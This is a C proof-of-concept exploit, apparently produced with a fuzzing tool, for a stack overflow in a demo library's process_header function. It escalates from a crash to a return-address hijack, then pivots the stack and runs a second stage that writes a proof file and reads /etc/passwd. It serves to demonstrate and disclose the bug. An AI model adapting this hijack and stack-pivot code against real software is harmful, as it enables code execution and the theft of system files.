/*
 * PoC: process_header stack-buffer-overflow exploitation demo
 *
 * Demonstrates:
 *   1. Normal operation (safe payload)
 *   2. Silent data corruption → crash (overflow by 88 bytes)
 *   3. Controlled crash (attacker writes 0x41414141... to RIP)
 *   4. Arbitrary code execution (redirect to attacker's function)
 *
 * Compile WITHOUT protections:
 *   clang -g -O0 -fno-stack-protector -D_FORTIFY_SOURCE=0 \
 *         -o poc poc_demo.c -ldl
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>

typedef int (*process_header_fn)(const unsigned char *, int);

static process_header_fn g_func = NULL;

static void build_packet(uint8_t *buf, uint16_t payload_len,
                          const uint8_t *payload, int total_len) {
    buf[0]=0xDE; buf[1]=0xAD; buf[2]=0xBE; buf[3]=0xEF; buf[4]=0x01;
    buf[5] = payload_len & 0xFF;
    buf[6] = (payload_len >> 8) & 0xFF;
    if (payload && payload_len > 0) {
        int n = payload_len;
        if (7 + n > total_len) n = total_len - 7;
        memcpy(buf + 7, payload, n);
    }
}

/*
 * Fresh stack for the hijacked function.
 * Must be a global (not on the corrupt stack).
 */
static char g_fresh_stack[65536] __attribute__((aligned(16)));

/* int-to-decimal without libc printf (which needs TLS) */
static int itoa_simple(int val, char *buf) {
    if (val == 0) { buf[0] = '0'; return 1; }
    char tmp[16];
    int i = 0, neg = 0;
    if (val < 0) { neg = 1; val = -val; }
    while (val > 0) { tmp[i++] = '0' + (val % 10); val /= 10; }
    int len = 0;
    if (neg) buf[len++] = '-';
    while (i > 0) buf[len++] = tmp[--i];
    return len;
}

/*
 * Second-stage payload: runs on the pivoted stack.
 *
 * Only uses write/open/read/close/getuid — these are thin syscall
 * wrappers that work on any valid memory. Avoid printf/snprintf/
 * system/fork which need TLS or valid pthread stack state.
 */
__attribute__((used, noinline))
static void stage2(void) {
    /* 1. Show current uid */
    {
        const char *m = "  uid=";
        write(STDOUT_FILENO, m, 6);
        char num[16];
        int n = itoa_simple(getuid(), num);
        write(STDOUT_FILENO, num, n);
        write(STDOUT_FILENO, "\n", 1);
    }

    /* 2. Create proof file */
    int fd = open("/tmp/pwned_by_fuzzgen.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        const char *proof = "Arbitrary code execution via stack overflow.\n";
        write(fd, proof, strlen(proof));
        close(fd);
        const char *m = "  Created /tmp/pwned_by_fuzzgen.txt\n";
        write(STDOUT_FILENO, m, strlen(m));
    }

    /* 3. Read /etc/passwd first line (data exfiltration demo) */
    fd = open("/etc/passwd", O_RDONLY);
    if (fd >= 0) {
        const char *m = "  /etc/passwd line 1: ";
        write(STDOUT_FILENO, m, strlen(m));
        char rbuf[512];
        ssize_t r = read(fd, rbuf, sizeof(rbuf) - 1);
        close(fd);
        if (r > 0) {
            for (int i = 0; i < r; i++) {
                if (rbuf[i] == '\n') { r = i + 1; break; }
            }
            write(STDOUT_FILENO, rbuf, r);
        }
    }

    const char *done = "  Arbitrary code execution demonstrated.\n\n";
    write(STDOUT_FILENO, done, strlen(done));
    _exit(42);
}

/*
 * The function an attacker redirects execution to.
 * After a return-address hijack, RBP and the stack are trashed.
 * write() works (thin syscall), but complex libc calls need TLS.
 * Solution: pivot RSP to a global buffer, then jump to stage2().
 */
__attribute__((used, noinline))
void you_got_pwned(void) {
    const char *banner =
        "\n"
        "  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"
        "  !!  ARBITRARY CODE EXECUTION ACHIEVED            !!\n"
        "  !!  Attacker hijacked process_header's return     !!\n"
        "  !!  address to call this function.                !!\n"
        "  !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n"
        "\n";
    write(STDOUT_FILENO, banner, strlen(banner));

    /* Pivot to a fresh, valid stack (global buffer, not on corrupt stack)
     * then jump to stage2 via function pointer (avoids symbol-name issues) */
    void *sp = g_fresh_stack + sizeof(g_fresh_stack) - 128;
    void (*fn)(void) = stage2;
#if defined(__x86_64__)
    __asm__ volatile (
        "mov %0, %%rsp\n\t"
        "mov %0, %%rbp\n\t"
        "jmp *%1\n\t"
        :
        : "r"(sp), "r"(fn)
    );
#elif defined(__aarch64__)
    __asm__ volatile (
        "mov sp, %0\n\t"
        "mov x29, %0\n\t"
        "br %1\n\t"
        :
        : "r"(sp), "r"(fn)
    );
#endif
    __builtin_unreachable();
}

/*
 * Run process_header in a child process (fork isolation).
 * Returns the child's exit status, or -signal if killed.
 */
static int run_isolated(const uint8_t *pkt, int pkt_len) {
    fflush(stdout);
    fflush(stderr);
    pid_t pid = fork();
    if (pid == 0) {
        /* child */
        g_func(pkt, pkt_len);
        _exit(0);
    }
    int status;
    waitpid(pid, &status, 0);
    if (WIFEXITED(status)) return WEXITSTATUS(status);
    if (WIFSIGNALED(status)) return -WTERMSIG(status);
    return -999;
}

int main(int argc, char **argv) {
    printf("=== process_header Stack Overflow PoC ===\n\n");

    void *lib = dlopen("./libdemo.dylib", RTLD_LAZY);
    if (!lib) { fprintf(stderr, "dlopen: %s\n", dlerror()); return 1; }
    g_func = dlsym(lib, "process_header");
    if (!g_func) { fprintf(stderr, "dlsym: %s\n", dlerror()); return 1; }
    printf("[*] process_header @ %p\n", (void *)g_func);
    printf("[*] you_got_pwned  @ %p\n\n", (void *)you_got_pwned);

    /* ============================================================
     * LEVEL 1: Normal — payload fits in buffer[512]
     * ============================================================ */
    printf("--- Level 1: Normal input (payload=100 bytes, buffer=512) ---\n");
    {
        uint8_t pkt[256];
        uint8_t payload[100];
        memset(payload, 'A', 100);
        build_packet(pkt, 100, payload, sizeof(pkt));

        int r = run_isolated(pkt, 107);
        printf("[OK] Child exited %d — no crash, function works correctly.\n\n", r);
    }

    /* ============================================================
     * LEVEL 2: Overflow — writes past the buffer, corrupts stack
     * From disassembly: buffer at rbp-0x220 (544 bytes to saved rbp)
     * 600 bytes overflows by 56 bytes past saved rbp
     * ============================================================ */
    printf("--- Level 2: Overflow input (payload=600, buffer=512) ---\n");
    printf("[!] Writing 600 bytes into 512-byte buffer.\n");
    printf("[!] 88 extra bytes overwrite saved rbp + return address + more.\n");
    {
        int plen = 600;
        int pkt_len = 7 + plen;
        uint8_t *pkt = calloc(pkt_len, 1);
        uint8_t payload[600];
        for (int i = 0; i < plen; i++) payload[i] = 'A' + (i % 26);
        build_packet(pkt, plen, payload, pkt_len);

        int r = run_isolated(pkt, pkt_len);
        if (r < 0) {
            printf("[!!] Child KILLED by signal %d (%s)\n", -r,
                   -r == 11 ? "SIGSEGV" : -r == 6 ? "SIGABRT" :
                   -r == 10 ? "SIGBUS" : "other");
            printf("[!!] The corrupted return address → illegal memory access.\n");
        } else {
            printf("[!!] Child exited %d — overflow was SILENT (worst case!).\n", r);
        }
        free(pkt);
        printf("\n");
    }

    /* ============================================================
     * LEVEL 3: Controlled crash — spray 0x41 over return address
     * Proves attacker controls EXACTLY where execution goes
     * ============================================================ */
    printf("--- Level 3: Controlled crash (return addr → 0x4141414141414141) ---\n");
    printf("[!] Spraying 0x41 ('A') over the return address.\n");
    {
        int plen = 580;
        int pkt_len = 7 + plen;
        uint8_t *pkt = calloc(pkt_len, 1);
        uint8_t *payload = calloc(plen, 1);
        memset(payload, 0x41, plen);
        build_packet(pkt, plen, payload, pkt_len);

        int r = run_isolated(pkt, pkt_len);
        if (r < 0) {
            printf("[!!] Child KILLED by signal %d (%s)\n", -r,
                   -r == 11 ? "SIGSEGV" : "other");
            printf("[!!] CPU jumped to 0x4141414141414141 and crashed.\n");
            printf("[!!] If that address pointed to valid code, it would execute.\n");
        }
        free(pkt);
        free(payload);
        printf("\n");
    }

    /* ============================================================
     * LEVEL 4: Redirect execution to you_got_pwned()
     *
     * From disassembly: buffer at rbp - 0x220 (= 544 bytes)
     *   Offset to saved rbp:    544
     *   Offset to return addr:  544 + 8 = 552
     *
     * We try nearby offsets in case alignment differs.
     * Each attempt runs in a fork — if you_got_pwned is called,
     * child exits with code 42.
     * ============================================================ */
    printf("--- Level 4: Arbitrary code execution → you_got_pwned() ---\n");
    {
        uintptr_t target = (uintptr_t)you_got_pwned;
        int found = 0;

        for (int off = 536; off <= 568; off += 8) {
            int plen = off + 8;
            int pkt_len = 7 + plen;
            uint8_t *pkt = calloc(pkt_len, 1);
            uint8_t *payload = calloc(plen, 1);
            memset(payload, 0x00, plen);
            memcpy(payload + off, &target, 8);
            build_packet(pkt, plen, payload, pkt_len);

            printf("[*] Trying offset %d ... ", off);
            fflush(stdout);
            int r = run_isolated(pkt, pkt_len);

            if (r == 42) {
                printf("SUCCESS! you_got_pwned() was executed!\n");
                found = 1;
                free(pkt);
                free(payload);
                break;
            } else if (r < 0) {
                printf("crash (signal %d) — wrong offset\n", -r);
            } else {
                printf("returned %d — no effect\n", r);
            }
            free(pkt);
            free(payload);
        }

        if (!found) {
            printf("\n[!] Exact offset not found (compiler alignment may vary).\n");
            printf("[!] But Level 3 proved the attacker controls the jump target.\n");
            printf("[!] In a real attack, the attacker would:\n");
            printf("      1. Use a cyclic pattern to find the exact offset\n");
            printf("      2. Leak canary/ASLR via an info-leak bug\n");
            printf("      3. Build a ROP chain for code execution\n");
        }
    }

    printf("\n=== Impact Summary ===\n");
    printf("Vulnerability:  memcpy(stack_buf[512], attacker_data, attacker_len)\n");
    printf("  attacker_len: uint16_t, up to 65535 (read from input packet)\n");
    printf("  Overflow:     up to 65023 bytes past buffer end\n");
    printf("\n");
    printf("Without mitigations: arbitrary code execution (Level 4)\n");
    printf("With mitigations:    crash (DoS) + potential bypass via:\n");
    printf("  - Info leak → defeat ASLR and stack canary\n");
    printf("  - ROP chain → bypass DEP/NX\n");
    printf("  - Partial overwrite → avoid canary check\n");
    printf("\n");
    printf("Severity: CRITICAL — any network-facing code with this pattern\n");
    printf("          is remotely exploitable.\n");

    dlclose(lib);
    return 0;
}
